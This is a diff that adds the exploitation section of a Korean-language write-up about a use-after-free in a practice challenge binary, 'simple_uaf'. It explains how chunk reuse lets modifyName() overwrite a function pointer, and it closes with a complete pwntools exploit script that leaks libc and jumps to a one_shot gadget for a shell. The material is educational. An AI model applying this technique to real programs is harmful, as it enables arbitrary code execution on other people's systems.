@@ -106,4 +106,77 @@ gdb 에서 확인하면 아래와 같다.
 
 여기서 다시 `addPerson` 으로 name 길이 47 의 영역을 똑같이 할당한다면?
 
+![atk6](../../.images/simple_uaf13.png)
+![atk7](../../.images/simple_uaf14.png)
 
+위와 같이 **name** 의 공간으로 쓰던 두 번째 청크가 person 구조체의 청크로 할당되고, person 구조체의 청크로 쓰이던 첫 번째 청크가 **name** 의 공간으로 할당되었다.
+
+그림으로 표현하자면 이런 모습.
+
+![atk8](../../.images/simple_uaf15.png)
+
+이렇게 되면, 못해도 99바이트까지는 수정을 할 수 있는 `modifyName()` 함수에서 **name** 을 바꿀 때 **name** 을 넘어서 person 구조체의 요소들까지 건드릴 수 있게된다.
+
+필자는 아래와 같이 `printInfo()` 함수포인터를 조작하려고한다.
+
+![atk9](../../.images/simple_uaf16.png)
+
+![atk9](../../.images/simple_uaf17.png)
+
+쉘은 **one_shot gadget** 의 도움을 받아서 실행하였다.
+
+### **\<payload>**
+
+```python
+# simple_uaf exploit
+
+from pwn import *
+one2=0x10a45c
+def menu(fd,num):
+    fd.recvuntil("> ")
+    fd.sendline(str(num))
+
+s=process("./simple_uaf")
+shell_off=0x4F440
+s.recvuntil("You will thank you for this : ")
+libc_base=int(s.recv(12),16)*0x100
+log.info("[+]libc_base : "+hex(libc_base))
+
+menu(s,1)
+s.recvuntil(": ")
+s.sendline("a"*47)
+s.recvuntil(": ")
+s.sendline("12")
+
+menu(s,3)
+s.recvuntil(": ")
+s.sendline("0")
+
+menu(s,1)
+s.recvuntil(": ")
+s.sendline("b"*47)
+s.recvuntil(": ")
+s.sendline("2")
+
+menu(s,2)
+s.recvuntil(": ")
+s.sendline("1")
+s.recvuntil(": ")
+s.sendline(b"a"*88+p64(libc_base+one2))
+s.recvuntil(": ")
+s.sendline("3")
+
+menu(s,4)
+s.recvuntil(": ")
+s.sendline("1")
+s.interactive()
+```
+
+
+.
+
+.
+
+.
+
+**Contact :** a42873410@gmail.com
